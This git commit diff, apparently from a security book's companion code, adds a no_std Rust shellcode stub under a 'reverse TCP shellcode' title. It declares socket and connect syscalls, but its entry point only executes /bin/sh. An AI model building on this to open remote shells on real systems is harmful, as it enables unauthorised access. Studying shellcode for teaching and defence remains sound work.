46afb0d5b020581e7d31a88a9bdf7be5d701e7ad
Sylvain Kerkour <sylvain@kerkour.com>
2021-09-03 12:47:39 +0000

    ch_08: reverse TCP shellcode

--- ch_08/reverse_tcp/src/main.rs
+++ ch_08/reverse_tcp/src/main.rs
@@ -1,3 +1,56 @@
-fn main() {
-    println!("Hello, world!");
+#![no_std]
+#![no_main]
+#![feature(asm)]
+
+#[panic_handler]
+fn panic(_: &core::panic::PanicInfo) -> ! {
+    loop {}
+}
+
+const SYS_DUP2: u64 = 33;
+const SYS_SOCKET: u64 = 41;
+const SYS_CONNECT: u64 = 42;
+const SYS_EXECVE: u64 = 59;
+
+unsafe fn syscall2(syscall: u64, arg1: u64, arg2: u64) -> u64 {
+    let ret: u64;
+    asm!(
+        "syscall",
+        in("rax") syscall,
+        in("rdi") arg1,
+        in("rsi") arg2,
+        out("rcx") _,
+        out("r11") _,
+        lateout("rax") ret,
+        options(nostack),
+    );
+    ret
+}
+
+unsafe fn syscall3(syscall: u64, arg1: u64, arg2: u64, arg3: u64) -> u64 {
+    let ret: u64;
+    asm!(
+        "syscall",
+        in("rax") syscall,
+        in("rdi") arg1,
+        in("rsi") arg2,
+        in("rdx") arg3,
+        out("rcx") _,
+        out("r11") _,
+        lateout("rax") ret,
+        options(nostack),
+    );
+    ret
+}
+
+#[no_mangle]
+fn _start() -> ! {
+    let shell: &str = "/bin/sh\x00";
+    let argv: [*const &str; 2] = [&shell, core::ptr::null()];
+
+    unsafe {
+        syscall3(SYS_EXECVE, shell.as_ptr() as u64, argv.as_ptr() as u64, 0);
+    };
+
+    loop {}
 }
